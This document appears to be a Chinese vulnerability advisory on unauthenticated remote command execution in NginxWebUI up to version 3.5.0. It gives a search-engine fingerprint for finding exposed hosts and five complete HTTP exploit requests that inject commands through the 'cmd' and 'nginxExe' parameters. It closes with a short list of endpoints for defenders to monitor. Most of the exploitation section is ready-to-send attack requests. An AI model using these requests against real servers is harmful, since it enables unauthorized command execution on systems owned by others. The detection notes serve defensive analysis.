# NginxWebUI run Cmd 远程命令执行漏洞

## 漏洞描述

NginxWebUI是一款图形化管理nginx配置的工具，能通过网页快速配置nginx的各种功能，包括HTTP和TCP协议转发、反向代理、负载均衡、静态HTML服务器以及SSL证书的自动申请、续签和配置，配置完成后可以一键生成nginx.conf文件，并控制nginx使用此文件进行启动和重载。

NginxWebUI后台提供执行nginx相关命令的接口，由于未对用户的输入进行过滤，导致可在后台执行任意命令。并且该系统权限校验存在问题，导致存在权限绕过，在前台可直接调用后台接口，最终可以达到无条件远程命令执行的效果。

## 影响范围

nginxWebUI <= 3.5.0

网络空间测绘语法：app="nginxWebUI"

## 漏洞利用

### 命令执行一

```
GET /AdminPage/conf/runCmd?cmd=calc%26%26nginx HTTP/1.
Host: 127.0.0.1:8080
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: corsSec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

### 命令执行二

```
POST /AdminPage/remote/cmdOver HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

remoteId=local&cmd=start calc%26%26nginx&interval=1
```

### 命令执行三

```
POST /Api/nginx/runNginxCmd HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: corsSec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

cmd=calc%26%26nginx
```

### 命令执行四

```
GET /AdminPage/conf/reload?nginxExe=calc%20%7C HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: corsSec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


### 命令执行五

```
POST /AdminPage/conf/check HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 91

nginxExe=calc%20%7C&json={"nginxContent":"","subContent":"[]","subName":"[]"}&nginxPath=/1/
```

## 研判分析

关注以下请求方法和路径

- GET、'/AdminPage/conf/runCmd?cmd='
- POST、'/AdminPage/remote/cmdOver'
- POST、'/Api/nginx/runNginxCmd'
- GET、'/AdminPage/conf/reload?nginxExe='
- POST、'/AdminPage/conf/check'
- POST、'/AdminPage/conf/saveCmd'
- GET、'/AdminPage/conf/checkBase'
- POST、'/AdminPage/conf/saveCmd'
- GET、'/Api/nginx/check'

当请求方法为POST时，需要结合body信息进行分析。body中常见的信息中如："cmd"或者"nginxExe"等。

## 参考链接

nginxWebUI runCmd 未授权远程代码执行

<http://www.hackdig.com/07/hack-1031358.htm>
